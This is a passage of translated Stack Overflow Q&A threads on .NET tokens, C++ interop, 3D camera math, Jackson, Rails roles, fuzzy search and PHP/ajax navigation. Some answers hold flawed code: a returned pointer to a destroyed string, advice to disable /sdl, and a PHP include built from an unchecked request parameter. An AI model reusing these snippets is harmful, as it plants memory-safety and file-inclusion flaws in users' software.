调试[`BootstrapContext`](http://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.bootstrapcontext.aspx)它有 4 个有用的属性：

```
SecurityToken
SecutiryTokenHandler
Token
TokenBytes 
```

应用前域重置 SecurityToken 和 SecurityTokenHandler 有值，重置后 Token 有值。

在重置后目测 Token 的值，看起来这是原始的 SAML XML，所以我大概可以从中重新水化一个完整的 SecutiryToken 但这似乎很奇怪，我找不到任何文档。

有什么想法可以确保 SecurityToken 始终可用，以免我弄乱令牌 XML 吗？

**更新**

使用 dotPeek 查看框架源代码中发生的情况，我可以看到导致这种行为的执行路径，但我无法确定为什么需要这种方式以及如何避免这种方式的任何原因。

最后我放弃了尝试解决它，现在使用下面的代码来确保我有一个令牌

```
if (context.SecurityToken != null)
{
    token = context.SecurityToken;
}
else if (context.Token.IsNotEmpty())
{
    var handlers = FederatedAuthentication.FederationConfiguration.IdentityConfiguration.SecurityTokenHandlers;
    token = handlers.ReadToken(new XmlTextReader(new StringReader(context.Token)));
} 
```

我现在担心的是我错过了这种行为背后的一些推理，我上面的修复将在某个时候爆炸。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-04T14:14:37.583

我偶然发现了同样的问题。我看到令牌具有令牌的 xml 表示并且 SecurityToken 为空。我还注意到这很容易通过杀死 w3wp.exe 来重现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-12-23T13:52:37.523

我已经通过删除包括 Fedauth cookie 的浏览器 cookie 解决了这个问题。再次调试后，我能够获得所有需要的值

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-17T09:51:51.480

当我实现微软的[ClaimsAwareWebFarm](http://code.msdn.microsoft.com/Claims-Aware-Web-Farm-088a7a4f)示例时，我遇到了同样的问题。将此部分添加到 web.config 时会出现问题：

```
 <caches>
    <sessionSecurityTokenCache type="CacheLibrary.SharedSessionSecurityTokenCache, CacheLibrary">
      <!--cacheServiceAddress points to the centralized session security token cache service running in the web farm.-->
      <cacheServiceAddress url="http://localhost/SecurityTokenCacheService/SessionSecurityTokenCacheService.svc" />
    </sessionSecurityTokenCache>
  </caches> 
```

感谢 Matt 提供的解决方法！

# c++ - 如何使用 Visual Studio 自动记录断言？

> ID：13514554
> 
> 赞同：1
> 
> 时间：2012-11-22T14:14:23.983
> 
> 标签：c++, debugging, visual-studio-2008, assert

我是使用 Visual Studio 2008 和 C++ 的新手。我的任务是运行一个自动化系统框架，该框架在应用程序的调试版本上运行一组测试，并记录介于两者之间的所有断言。

有人可以指出我从哪里开始的正确方向。Visual Studio 是否为记录断言提供任何此类支持？如果没有，我可以为此目的使用什么其他资源？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T21:52:37.393

我不知道 VS2008 中的任何特定功能，但一种选择是根据您的需要重新定义 assert() 宏。沿着这条线的东西：

```
#define assert(expression) Logfile::getSingletonPtr()->write(...); 
```

您可以根据需要写出表达式、文件、行等。

注意：这种方法会导致[警告 C4005](http://msdn.microsoft.com/en-us/library/8d10sc3w%28v=vs.80%29.aspx) (macro-redefinition)，不要惊讶。

如果您想在 assert() 中使用其他消息，还可以查看[此 SO 线程。](https://stackoverflow.com/questions/3692954/add-custom-messages-in-assert)

# opengl-es - 如何在飞行模拟器中计算向上矢量？

> ID：13514556
> 
> 赞同：1
> 
> 时间：2012-11-22T14:14:39.590
> 
> 标签：opengl-es, 3d, opengl-es-2.0

我正在为 OpenGL ES 2.0 编写 3D 应用程序，其中用户设置路径并飞过某些地形。它基本上是一个轨道上的飞行模拟器。

路径由从样条线创建的一系列点定义。每个时间片我使用插值推进当前位置，即我在 p0 到 p1 之间插值，然后当我到达 p1 时，我在 p1 和 p2 之间插值，最后从 pN 回到 p0。

我创建了一个类似于 gluLookAt 的视图矩阵。eye coord 是当前位置，look at 是路径上的下一个位置和一个 up (0, 0, 1)。所以相机看向它接下来要飞到的地方，Z指向天空。

但现在我想在转弯时“银行”。即向上矢量不一定是直接向上的，而是基于转弯率的变化。我知道我当前的方向和我最后的方向，所以我可以增加或减少银行的数量。点积会告诉我转弯的角度，叉积会告诉我它是向左还是向右。我可以保持倾斜角度并将其保持在 -/+70 度的范围内，适当地增加或减少。

我认为这是正确的方法，但我可能会花很长时间实施它来发现它不是。

我是否走在正确的轨道上，是否有样本可以证明我正在尝试做的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T08:52:34.103

由于您似乎有一架在正常条件下飞行的平稳的飞机，因此您不需要太多……您的方法几乎是正确的，并且看起来很自然。您所需要的只是 3 个连续点 A、B、C: 之间的叉积`cross = cross(A-B, C-B)`。现在 cross 是您需要围绕“前向”矢量转动平面的矢量：自然，平面的向上矢量是（-gravitation）通常是（0,0,1），而 B 点的前向矢量是 CB（如果不需要插值） ) 现在“侧”向量在`side = normalized(cross(forward, up))`这里是您使用银行的地方：`side = side + cross*planeCorrectionParameter`然后`up = cross(normalized(side), normalized(forward))`. “planeCorrectionParameter”是您应该使用的参数，实际上它代表了一些参数的组合，例如机翼和船体的尺寸、空气密度、重力、速度、质量......

请注意，上面的某些交叉操作可能需要按参数顺序进行交换（cross(a,b) 应该是 cross(b,a)），所以请尝试一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:50:38.470

您的方法听起来正确，但看起来不自然。以一条看起来像 sin 函数的路径为例：当飞机实际上向右移动时，它可能向左“移动”。

我可以提到您的问题的两种解决方案。首先，您可以取样条的导数。我假设您的样条曲线是一个`f(t)`返回点的函数`(x, y, z)`。参数曲线的导数是指向旋转中心的向量：它将指向圆形路径的中心。

使用上述方法需要注意几点：直线的导数是`0`，向量也将是`0`，因此您必须手动修复上向量。此外，您可能希望修复此向量，使其不会颠倒。

这很有效，而且看起来比你的方法更好。但对于某些曲线，它仍然看起来不自然。我能提到的最好的方法是四元数插值，例如[Slerp](http://en.wikipedia.org/wiki/Slerp)。在曲线的每个点，您还有一个“右”向量：指向平面右侧的向量。从曲线和这个向量，你可以计算出此时的向上向量。然后，您使用四元数插值沿曲线插入向上向量。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T15:06:21.917

如果位置和旋转仅取决于样条曲线曲率，最简单的方法将是3D 样条曲线的[数值微分](http://en.wikipedia.org/wiki/Numerical_differentiation)（您将有 2 个导数，一个用于垂直分量，一个用于水平分量）。您的 UP 和 side 将是切线的法线。

# c# - Dllimport 将字符串从 C# 传递到 C++

> ID：13514560
> 
> 赞同：2
> 
> 时间：2012-11-22T14:14:45.660
> 
> 标签：c#, c++, string, dllimport

我正在尝试使用平台调用将字符串从 C# 传递到 C++。

*   C++ 代码：

    ```
    #include<string>
    using namespace std;

    extern "C" 
    {
         double __declspec(dllexport) Add(double a, double b)
         {
             return a + b;
         }
         string __declspec(dllexport) ToUpper(string s)
         {
             string tmp = s;
             for(string::iterator it = tmp.begin();it != tmp.end();it++)
                 (*it)-=32;
             return tmp;
         }
    } 
    ```

*   C#代码：

    ```
    [DllImport("TestDll.dll", CharSet = CharSet.Ansi, CallingConvention =CallingConvention.Cdecl)]
    public static extern string ToUpper(string s); 

    static void Main(string[] args)
    {
        string s = "hello";
        Console.WriteLine(Add(a,b));
        Console.WriteLine(ToUpper(s));
    } 
    ```

我收到一个 SEHException。就不能这样使用`std::string`吗？我应该`char*`改用吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-05-11T11:32:33.517

正确的决定

C# 方面：

```
[DllImport("CppDll.dll", CallingConvention = CallingConvention.Cdecl)]
public static extern IntPtr GetString(string s);

public string GetString_(string s)
{            
    var ptr = GetString(s);                                
    var answerStr = Marshal.PtrToStringAnsi(ptr);
    return answerStr;
} 
```

C++ 方面：

```
extern "C" __declspec(dllexport) const char* GetString(char* s)
{       
    string workStr(s);      
    int lenStr = workStr.length() + 1;
    char* answer = new char[lenStr];
    const char * constAnswer = new char[lenStr];
    strcpy(answer, workStr.c_str());
    constAnswer = answer;
    return constAnswer;
} 
```

并在 cpp 项目的设置中禁用 /sdl-。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-12-21T09:40:10.930

在不导致内存泄漏的情况下执行此操作的一种方法是使用回调。

C# 方面：

```
private delegate bool DLLCallback(IntPtr message);

[DllImport(@"YourLibrary.dll", SetLastError = true, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Auto)]
private static extern void Receive(DLLCallback callback);

private static bool callback(IntPtr ptr)
{
    string result = Marshal.PtrToStringAnsi(ptr);

    Console.WriteLine(result);
    // If the Heap is used               
    // Marshal.FreeHGlobal(ptr);
    return true;
}

private static void Main(string[] args)        {
    Receive(callback);
} 
```

C++ 方面：

```
extern "C" {
   typedef BOOL(__stdcall* OutputCallback)(const char* str);

   __declspec(dllexport) void Receive(OutputCallback callback)
   {
        char buffer[BUFFER_SIZE];
        ZeroMemory(buffer, BUFFER_SIZE);
        BOOL callbackResult = callback(buffer);
   }
} 
```

还有其他选择。这是一篇关于在托管代码和非托管代码之间传递字符串的好文章：[article](https://www.codeproject.com/Articles/1189085/Passing-strings-between-managed-and-unmanaged-code)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-22T14:39:13.017

我建议使用 char*。这是一个可能的解决方案。

如果创建另一个 C# 函数 ToUpper_2 如下

C# 方面：

```
[DllImport("TestDll.dll"), CallingConvention = CallingConvention.Cdecl]
private static extern IntPtr ToUpper(string s);

public static string ToUpper_2(string s) 
{
    return Marshal.PtrToStringAnsi(ToUpper(string s));
} 
```

C++ 方面：

```
#include <algorithm>
#include <string>

extern "C" __declspec(dllexport) const char* ToUpper(char* s) 
{
    string tmp(s);

    // your code for a string applied to tmp

    return tmp.c_str();
} 
```

你完成了！

# javascript - 如何从父文档中获取元素？

> ID：13514563
> 
> 赞同：1
> 
> 时间：2012-11-22T14:14:52.563
> 
> 标签：javascript, jsp, iframe

我有一个名为 win1 的窗口，它生成一个名为 iframe1 的 iframe。iframe1 生成另一个名为 iframe2 的 iframe。如何访问 win1 的元素？如果我必须得到 iframe2 的父级，我会这样做：

```
window.parent.document.getElementById('ID').style.display="none"; 
```

如果我想从 iframe2 获得 win1 的元素 ID，我该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:20:35.887

您可以在 iframe2 中使用 window.top 来访问最顶层窗口的对象。或者，您可以访问：

```
window.    parent.    parent
(iframe2)  (iframe1)  (top window) 
```

# magento - Magento：如何将前端发票打印为 HTML？

> ID：13514565
> 
> 赞同：2
> 
> 时间：2012-11-22T14:14:55.557
> 
> 标签：magento, magento-1.7

我在 Magento 1.7.0.2 上。如何以与前端相同的方式从后端打印发票？我希望它是 HTML 格式而不是 PDF。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T15:38:51.187

假设您想从管理订单详细信息页面一次打印一张发票

创建自定义管理模块

使用以下方法添加控制器

```
public function printInvoiceAction()
{  

    $invoiceId = (int) $this->getRequest()->getParam('invoice_id');
    if ($invoiceId) {
        $invoice = Mage::getModel('sales/order_invoice')->load($invoiceId);
        $order = $invoice->getOrder();
    } else {
        $order = Mage::registry('current_order');
    }

    if (isset($invoice)) {
        Mage::register('current_invoice', $invoice);
    }
    $this->loadLayout('print');
    $this->renderLayout();

} 
```

参考 app/code/core/Mage/Sales/controllers/GuestController.php 中的 printInvoiceAction()

然后在您的自定义 layout.xml`<sales_guest_printinvoice>`中使用 /app/design/frontend/base/default/layout/sales.xml 作为您的模板

然后添加一个按钮，链接到以下网址（需要从订单中获取发票ID）/customModule/controller/printInvoice/invoice_id/xxx

（未测试，所以如果您遇到任何问题，请告诉我）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:37:15.427

您应该创建用于打印的自定义 css 文件`print.css`。你应该添加“打印按钮”，这将调用`window.print()`

# ios - mobileconfig 文件中 webclip 有效负载中的半透明状态栏配置

> ID：13514568
> 
> 赞同：3
> 
> 时间：2012-11-22T14:15:10.327
> 
> 标签：ios, ipad, configuration, mobile-safari

当我开发 web 应用程序时，我可以设置 `<meta name="apple-mobile-web-app-capable" content="yes"/>`，所以当用户在 ipad 上使用 safari 浏览器创建 web 剪辑时，此页面将以全屏模式打开。

我也可以使用下一个元标记将状态栏设置为半透明。

```
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/> 
```

我还可以使用 .mobileconfig 文件配置 webclip。[网页剪辑负载](http://developer.apple.com/library/ios/#featuredarticles/iPhoneConfigurationProfileRef/Introduction/Introduction.html)

但是在这里我找不到有效负载的选项来设置状态栏半透明。在文档中，我只找到了 URL、Label、Icon、IsRemovable 键。但在一个示例中，我还发现了将页面设置为全屏模式但带有黑色状态栏的全屏键。

问题：可能有人知道是否可以在 mobileconfig 文件中的 web 剪辑有效负载中设置状态栏半透明？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-05-13T10:00:42.847

我有同样的问题。你不能用 mobileconfig 做到这一点。

我通过以下方式解决了它：

首先在您网站的 html 头部部分设置元名称 apple-mobile-web-app-status-bar-style 和 apple-mobile-web-app-capable。

在此之后，您必须使用 iOS 设备上的网络剪辑删除您的个人资料并重新安装。这将清除您 iOS 设备上的缓存，并从您的 html 文件中重新读取元名称标签。

最好的问候 Filellinas

# c# - 在 Matrix.CreateLookAt 中确定上向量和变换向量

> ID：13514569
> 
> 赞同：0
> 
> 时间：2012-11-22T14:15:11.630
> 
> 标签：c#, xna, xna-4.0

我有

```
Vector3 PlayerPosition = new Vector3(0,0,0);
Matrix JetztMatrix = Matrix.CreateRotationX(pitch) * Matrix.CreateRotationY(yaw);
ef.View = Matrix.CreateLookAt(PlayerPosition, Vector3.Transform(new Vector3(?1,?2,?3), JetztMatrix) + PlayerPosition, new Vector3(?4,?5,?6)); 
```

不知何故，我总是达到某个阈值，所以屏幕滚动而不是旋转。

因此，例如，我将 -180° 到 +180° 作为偏航。这导致一个转弯，但不是在一条直线上。正如我所说，它移动，然后屏幕滚动，它再次移动。

如何确定?1 到?6

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T20:49:22.557

`ef.View = Matrix.CreateLookAt(PlayerPosition, playerPosition + JetzMatrix.Forward, Vector3.Up);`

这`Vector3.Up`将防止相机滚动。根据您的问题，很难准确理解您最终想要得到什么。如果这不能解决您的问题或产生其他一些不受欢迎的动作，请更详细地描述您想要的功能。

# java - 杰克逊 - 将 java 列表写入 json 数组的最佳方法

> ID：13514570
> 
> 赞同：59
> 
> 时间：2012-11-22T14:15:10.890
> 
> 标签：java, json, jackson

我想使用杰克逊将 ArrayList 转换为 JsonArray。

**Event.java**：这是具有两个字段“field1”、“field2”的 java bean 类，映射为 JsonProperty。

我的目标是：

转变

```
ArrayList<Event> list = new ArrayList<Event>();
    list.add(new Event("a1","a2"));
    list.add(new Event("b1","b2")); 
```

到

```
[
{"field1":"a1", "field":"a2"},
{"field1":"b1", "field":"b2"}
] 
```

我能想到的方法是： **writeListToJsonArray()**：

```
public void writeListToJsonArray() throws IOException {  
    ArrayList<Event> list = new ArrayList<Event>();
    list.add(new Event("a1","a2"));
    list.add(new Event("b1","b2"));

    OutputStream out = new ByteArrayOutputStream();

    JsonFactory jfactory = new JsonFactory();
    JsonGenerator jGenerator = jfactory.createJsonGenerator(out, JsonEncoding.UTF8);
    ObjectMapper mapper = new ObjectMapper();
    jGenerator.writeStartArray(); // [

    for (Event event : list) {
        String e = mapper.writeValueAsString(event);
        jGenerator.writeRaw(usage);
        // here, big hassles to write a comma to separate json objects, when the last object in the list is reached, no comma 
    }

    jGenerator.writeEndArray(); // ]

    jGenerator.close();

    System.out.println(out.toString());
} 
```

我正在寻找类似的东西：

```
generator.write(out, list) 
```

这直接将列表转换为json数组格式，然后将其写入输出流“out”。

更贪婪：

```
generator.write(out, list1)

generator.write(out, list2) 
```

这只会将 list1、list2 转换/添加为单个 json 数组。然后将其写入“out”

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-11-22T14:33:44.460

这太复杂了，Jackson 通过它的 writer 方法处理列表，就像它处理常规对象一样。假设我没有误解你的问题，这对你来说应该很好：

```
public void writeListToJsonArray() throws IOException {  
    final List<Event> list = new ArrayList<Event>(2);
    list.add(new Event("a1","a2"));
    list.add(new Event("b1","b2"));

    final ByteArrayOutputStream out = new ByteArrayOutputStream();
    final ObjectMapper mapper = new ObjectMapper();

    mapper.writeValue(out, list);

    final byte[] data = out.toByteArray();
    System.out.println(new String(data));
} 
```

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2015-05-11T09:49:44.800

`toByteArray()`正如@atrioom 所说，我找不到，所以我使用`StringWriter`，请尝试：

```
public void writeListToJsonArray() throws IOException {  

    //your list
    final List<Event> list = new ArrayList<Event>(2);
    list.add(new Event("a1","a2"));
    list.add(new Event("b1","b2"));

    final StringWriter sw =new StringWriter();
    final ObjectMapper mapper = new ObjectMapper();
    mapper.writeValue(sw, list);
    System.out.println(sw.toString());//use toString() to convert to JSON

    sw.close(); 
} 
```

或者只是使用`ObjectMapper#writeValueAsString`：

```
 final ObjectMapper mapper = new ObjectMapper();
    System.out.println(mapper.writeValueAsString(list)); 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2015-09-04T16:44:21.170

在 objectMapper 中，我们有 writeValueAsString() ，它接受对象作为参数。我们可以将对象列表作为参数传递回来获取字符串。

```
List<Apartment> aptList =  new ArrayList<Apartment>();
    Apartment aptmt = null;
    for(int i=0;i<5;i++){
         aptmt= new Apartment();
         aptmt.setAptName("Apartment Name : ArrowHead Ranch");
         aptmt.setAptNum("3153"+i);
         aptmt.setPhase((i+1));
         aptmt.setFloorLevel(i+2);
         aptList.add(aptmt);
    }
mapper.writeValueAsString(aptList) 
```

# ruby-on-rails - 在 Rails 中具有角色的操作（不是模型！）的授权

> ID：13514574
> 
> 赞同：0
> 
> 时间：2012-11-22T14:15:40.000
> 
> 标签：ruby-on-rails, authorization

如果我有一个具有一系列角色的简单 rails 用户模型，是否足以通过简单地检查该角色的模型角色属性并相应地阻止/继续来控制对操作的访问？

由于不可预见的复杂性，是否有我应该利用的高级系统？

**重要提示：**我不希望将用户/角色授权给模型（我已经知道 CanCan）。我希望在控制器级别进行安全性，以便我可以更详细地分解功能。

**更重要的是：**说真的，我不一定要问CanCan，请仔细阅读问题并注意！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T11:53:21.180

问题 1：是，问题 2：不是。

我只是保持简单

如果您检查控制器中的模型属性，控制器将限制所有没有设置此属性的用户。

前任：

```
def create
  @user.find(params[:user_id]) 
  if @user.admin?
  @post.new(params[:post]) 
  @post.create!
  end
end 
```

在用户模型中创建一个方法

```
def admin?
  role == "Admin"
end 
```

您应该编写比这更好的代码。控制器中有很多逻辑，但这将保留除管理员之外的所有内容。

# database - 如何在大数据中进行模糊搜索

> ID：13514575
> 
> 赞同：20
> 
> 时间：2012-11-22T14:15:43.297
> 
> 标签：database, search, indexing, fuzzy-search

我是那个领域的新手，我想知道最先进的技术是什么以及我可以在哪里阅读它。

假设我只有一个键/值存储，并且以某种方式定义了一些距离（key1，key2）（不确定它是否必须是度量，即三角形不等式是否必须始终保持）。

我想要的主要是一个 search(key) 函数，它返回所有带有键的项目到搜索键一定距离。也许距离限制是可配置的。也许这也只是一个惰性迭代器。也许也可以有一个计数限制，并且一个项目（键，值）在返回的集合中具有一定的概率 P，其中 P = 1/距离（键，搜索键）左右（即，完美匹配肯定是在集合和紧密匹配中至少有很高的概率）。

* * *

一个示例应用程序是[MusicBrainz](http://musicbrainz.org)中的指纹匹配。他们使用[AcoustId](http://acoustid.org)指纹并定义[了这个比较函数](https://github.com/lalinsky/acoustid-server/blob/master/postgresql/acoustid_compare.c)。他们使用 PostgreSQL GIN 索引，我猜（虽然我还没有完全理解/阅读 acoustid-server 代码）[GIN 部​​分匹配算法](http://www.postgresql.org/docs/devel/static/gin-implementation.html#GIN-PARTIAL-MATCH)，但我还没有完全理解这是否是我所要求的以及它是如何工作的。

* * *

对于文本，到目前为止我发现的是使用一些[语音算法](http://en.wikipedia.org/wiki/Phonetic_algorithm)来根据单词的发音来简化单词。一个例子是[here](http://playnice.ly/blog/2010/05/05/a-fast-fuzzy-full-text-index-using-redis/)。这主要是将搜索空间分解为更小的空间。然而，这有几个限制，例如它必须在较小的空间中仍然是完美的匹配。

但无论如何，我也在寻找更通用的解决方案，如果存在的话。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-23T09:00:05.763

没有（快速）通用解决方案，每个应用程序都需要不同的方法。

这两个示例实际上都没有进行传统的最近邻搜索。AcoustID（我是作者）只是在寻找精确匹配，但它会搜索大量哈希值，希望其中一些匹配。语音搜索示例使用变音位将单词转换为其语音表示，并且也只寻找完全匹配。

您会发现，如果您有大量数据，则使用巨大的哈希表进行精确搜索是您唯一可以实际做的事情。那么问题就变成了如何将模糊匹配转换为精确搜索。

一种常见的方法是将[局部敏感散列](http://en.wikipedia.org/wiki/Locality-sensitive_hashing)(LSH) 与智能散列方法一起使用，但正如您在两个示例中看到的那样，有时您可以使用更简单的方法。

顺便说一句，您正在寻找专门用于文本搜索的最简单方法，您可以将输入拆分为[N-gram](http://en.wikipedia.org/wiki/N-gram)并将其编入索引。根据您的距离函数的定义方式，这可能会为您提供正确的候选匹配，而无需太多工作。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-23T09:23:17.653

我建议你看看 FLANN [Fast Approximate Nearest Neighbors](https://github.com/mariusmuja/flann)。大数据中的模糊搜索也称为近似最近邻。

该库为您提供不同的度量，例如 Euclidian、Hamming 和不同的聚类方法：例如 LSH 或 k-means。

搜索总是分两个阶段。首先，您向系统提供数据以训练算法，这可能会很耗时，具体取决于您的数据。我在不到一分钟的时间内成功地聚集了 1300 万个数据（使用 LSH）。

然后是搜索阶段，非常快。您可以指定最大距离和/或最大邻居数。

正如 Lukas 所说，没有好的通用解决方案，每个域都会有自己的技巧来提高速度或找到更好的方法来使用您使用的数据的内部属性。

Shazam 使用具有几何投影的特殊技术来快速找到您的歌曲。在计算机视觉中我们经常使用 BOW：Bag of words，它最初出现在文本检索中。

如果您可以将数据视为图形，那么还有其他方法可以使用谱图理论进行近似匹配。

让我们知道。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-04-02T16:29:25.280

取决于您的键/值是什么样的，Levenshtein 算法（也称为 Edit-Distance）可以提供帮助。它计算修改一个字符串以获得另一个字符串所需的最少编辑操作数。

*   [http://en.wikipedia.org/wiki/Levenshtein_distance](http://en.wikipedia.org/wiki/Levenshtein_distance)
*   [http://www.levenshtein.net/](http://www.levenshtein.net/)

# php - 大任务 - 页面刷新和 ajax 问题

> ID：13514578
> 
> 赞同：1
> 
> 时间：2012-11-22T14:15:50.563
> 
> 标签：php, jquery, ajax, session, page-refresh

我有一个通过 ajax 动态加载内容的导航。但是，如果我刷新页面或访问另一个 url 并返回当前内容，我会在第一个菜单选项卡下看到旧内容。

现在我必须解决这个问题。

index.php 包括元素 header_registrated.inc.php、navigation.inc.php 和 main_container.inc.php

索引.php：

```
<?php include("inc/incfiles/header_registrated.inc.php"); ?>
<?php
if (!isset($_SESSION["userLogin"])) {
echo "<meta http-equiv=\"refresh\" content=\"0; url=http://localhost/project\">";
}
else {
echo "";
}
?>
<?php include("inc/incfiles/navigation.inc.php"); ?>
<?php include("inc/incfiles/main_container.inc.php"); ?>
<?php include("inc/incfiles/footer.inc.php"); ?> 
```

header_registrated.inc.php：

```
<?php
include ("inc/scripts/mysql_connect.inc.php");
session_start();
$user = $_SESSION["userLogin"];
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>title</title>
<link href="css/style.css" rel="stylesheet" type="text/css" />
<script language="JavaScript" src="js/framework/jquery.js"></script>
<script language="JavaScript" src="js/dropdown/window.js"></script>
<script language="JavaScript" src="js/navigation/navigation.js"></script>
</head>
<body>
</body> 
```

导航.inc.php：

```
 <div class="navigation">

    <ul>
        <li id="1">
            <div id="menuImage1" class="menuImage"></div>
            <div class="menuText"><p>Punkt 1</p></div>

            <div class="navigationDart"></div>
        </li>
        <li id="2">
            <div id="menuImage2" class="menuImage"></div>
            <div class="menuText"><p>Punkt 2</p></div>
        </li>
        <li id="3">
            <div id="menuImage3" class="menuImage"></div>
            <div class="menuText"><p>Punkt 3</p></div>
        </li>
        <li id="4">
            <div id="menuImage4" class="menuImage"></div>
            <div class="menuText"><p>Punkt 4</p></div>
        </li>
        <li id="5">
            <div id="menuImage5" class="menuImage"></div>
            <div class="menuText"><p>Punkt 5</p></div>
        </li>
        <li id="6">
            <div id="menuImage6" class="menuImage"></div>
            <div class="menuText"><p>Punkt 6</p></div>
        </li>
    </ul>

</div> 
```

main_container.inc.php：

```
<div class="mainContainer">

    <div class="containerHeader">

        <div class="contentHeader">

        </div>

    </div>

    <div class="contentContainer">

        <div class="content">

        </div>

        <div class="advertisement">

        </div>

    </div>

</div> 
```

现在 div 内容、cnotentHeader 和广告（在文件 main_content.inc.php 中）通过 ajax 填充。此外，导航有一些 jquery 效果，在页面刷新后也必须相同。

导航.js：

```
$(document).ready(function() {
    $.get('inc/incfiles/content_container/header/1.php', function(data) {
        $('.contentHeader').html(data);
    }); 

    $.get('inc/incfiles/content_container/content/1.php', function(data) {
        $('.content').html(data);
    }); 

    $.get('inc/incfiles/content_container/advertisement/1.php', function(data) {
        $('.advertisement').html(data);
    }); 
    var current = '1.php';
    $(".navigation li").click(function() {
        var quelle = $(this).attr('id') + ".php";

        // the current content doesn't load again
        if(current === quelle) {
            return;
        } 

        current = quelle;

        // content
        $(".content").fadeOut(function() {
            $(this).load("inc/incfiles/content_container/content/" + quelle).fadeIn('normal');
        })

        // advertisement
        $(".advertisement").fadeOut(function() {
            $(this).load("inc/incfiles/content_container/advertisement/" + quelle).fadeIn('normal');
        })

        // header
        $(".contentHeader").fadeOut(function() {
            $(this).load("inc/incfiles/content_container/header/" + quelle).fadeIn('normal');
        })

    });

    $(".navigation li").click(function() {
        $(".menuImage").removeClass("menuImageActive1");
        $(".menuImage").removeClass("menuImageActive2");
        $(".menuImage").removeClass("menuImageActive3");
        $(".menuImage").removeClass("menuImageActive4");
        $(".menuImage").removeClass("menuImageActive5");
        $(".menuImage").removeClass("menuImageActive6");
    });

    $("#1").mousedown(function() {
        $("#menuImage1").addClass("menuImageClick1"); // new class on mouse button press
    });

    $("#1").mouseup(function() {
        $("#menuImage1").removeClass("menuImageClick1");  //remove class after mouse button release
    });

    $("#1").click(function() {
        $("#menuImage1").addClass("menuImageActive1");
    });

    $("#2").mousedown(function() {
        $("#menuImage2").addClass("menuImageClick2"); // new class on mouse button press
    });

    $("#2").mouseup(function() {
        $("#menuImage2").removeClass("menuImageClick2");  //remove class after mouse button release
    });

    $("#2").click(function() {
        $("#menuImage2").addClass("menuImageActive2");
    });

    $("#3").mousedown(function() {
        $("#menuImage3").addClass("menuImageClick3"); // new class on mouse button press
    });

    $("#3").mouseup(function() {
        $("#menuImage3").removeClass("menuImageClick3");  //remove class after mouse button release
    });

    $("#3").click(function() {
        $("#menuImage3").addClass("menuImageActive3");
    });

    $("#4").mousedown(function() {
        $("#menuImage4").addClass("menuImageClick4"); // new class on mouse button press
    });

    $("#4").mouseup(function() {
        $("#menuImage4").removeClass("menuImageClick4");  //remove class after mouse button release
    });

    $("#4").click(function() {
        $("#menuImage4").addClass("menuImageActive4");
    });

    $("#5").mousedown(function() {
        $("#menuImage5").addClass("menuImageClick5"); // new class on mouse button press
    });

    $("#5").mouseup(function() {
        $("#menuImage5").removeClass("menuImageClick5");  //remove class after mouse button release
    });

    $("#5").click(function() {
        $("#menuImage5").addClass("menuImageActive5");
    });

    $("#6").mousedown(function() {
        $("#menuImage6").addClass("menuImageClick6"); // new class on mouse button press
    });

    $("#6").mouseup(function() {
        $("#menuImage6").removeClass("menuImageClick6");  //remove class after mouse button release
    });

    $("#6").click(function() {
        $("#menuImage6").addClass("menuImageActive6");
    });

    $("#1").click(function(){

        $(".navigationDart").animate({ 
            top: "16px"
                }, 500 );
        });
    $("#2").click(function(){
        $(".navigationDart").animate({ 
            top: "88px"
                }, 500 );
        });
    $("#3").click(function(){
        $(".navigationDart").animate({ 
            top: "160px"
                }, 500 );
        });
    $("#4").click(function(){
        $(".navigationDart").animate({ 
            top: "232px"
                }, 500 );
        });
    $("#5").click(function(){
        $(".navigationDart").animate({ 
            top: "304px"
                }, 500 );
        });
    $("#6").click(function(){
        $(".navigationDart").animate({ 
            top: "376px"
                }, 500 );
        });
    }); 
```

我的想法是使用 if(isset($_SESSION['ajaxresponse'])) 但我不知道该怎么做。

请帮我。我觉得我已经搜索了整个网络以找到答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T11:01:55.997

我建议使用通过 AJAX 将 PHP 与 jQuery 联系起来的库，这样可以大大缓解您的问题。该库是 phery [http://phery-php-ajax.net](http://phery-php-ajax.net) 只是对您的 navigation.js 文件进行了一些优化：

您需要将 AJAX 集中（或不集中）在一个文件中，以使其更容易。它可以在你的顶部`index.php`

```
function load($data){
  $r = new PheryResponse;

  if (!isset($_SESSION["userLogin"])) {
    return $r->redirect('http://localhost/project');
  }

  $path = 'inc/incfiles/content_container/';

  if (isset($data['id'])){
    $id = $data['id']. '.php';
  } else {
    if (!empty($_SESSION['id'])){
      $id = $_SESSION['id'];
    } else {
      $id = '1.php';
    }
  }

  $_SESSION['id'] = $id; // save the current ID and will load next time the person refreshes the page

  ob_start();
  include $path.'content/'.$id;
  $content = ob_get_clean();

  ob_start();
  include $path.'advertisement/'.$id;
  $ads = ob_get_clean();

  ob_start();
